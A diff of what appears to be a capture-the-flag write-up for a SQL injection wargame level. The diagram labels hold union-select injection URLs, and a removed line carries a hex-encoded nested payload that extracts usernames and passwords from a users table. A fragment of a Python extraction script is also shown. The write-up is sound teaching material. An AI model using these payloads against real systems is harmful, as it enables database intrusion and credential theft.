@@ -22,7 +22,7 @@
         }
         step0 -> step1[label="level6.php?user=0 union select %s from level6_users--",arrowhead="normal"];
         step3 -> step2[label="column length",arrowhead="normal"];
-        step4 -> step5[label="level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20,3,4,5 from level6_users-- ",arrowhead="normal"];
+        step4 -> step5[label="level6.php?user=0 union select 1,(HEX문),3,4,5 from level6_users-- ",arrowhead="normal"];
         step7 -> step6[label="@solve",arrowhead="normal"];
     }
 
@@ -32,6 +32,8 @@ Source Analysis
 ================================================================================================================
 
 - Target: Get the first user in table level6_users with status 1
+
+
 
 .. code-block:: html
 
@@ -112,4 +114,3 @@ Data Extract
     r = requests.post(url, cookies=cookies, params=params, verify=False)
 
     print r.content
-
